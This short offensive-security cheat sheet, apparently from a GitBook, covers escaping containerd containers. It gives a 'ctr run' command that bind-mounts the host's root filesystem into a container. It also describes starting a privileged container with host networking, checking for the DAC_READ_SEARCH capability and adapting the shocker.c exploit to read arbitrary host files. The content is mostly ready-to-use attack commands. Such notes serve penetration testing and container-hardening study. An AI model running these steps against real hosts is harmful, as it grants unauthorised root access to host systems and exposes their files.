# Containerd Attacks

## 1. Use case -User privileges in a host which is running Containerd

* `ctr image list` Check containerd images&#x20;
* Next Start a container and add it to host machine&#x20;
  * `ctr run --mount type=bind,src=/,dst=/,options=rbind -t ubuntu:latest ubuntu bash`
  * After that point you can reach root file system.&#x20;

### 2. Use Case - Abusing DAC\_READ\_SEARCH Capability

* Start a container in root mode with privileges.
* &#x20;`ctr run --privileged --net-host -t ubuntu:latest ubuntu bash`
* Check `capsh --print`
  * And find cap\_dac\_read\_search
  * `mount`
  * Check /etc/hosts is mounted or not
  * if it is there use the code [http://stealth.openwall.net/xSports/shocker.c](http://stealth.openwall.net/xSports/shocker.c)
  * Change there main function in order to give argument and read anything in host system.&#x20;
  * ![](../../.gitbook/assets/image.png)
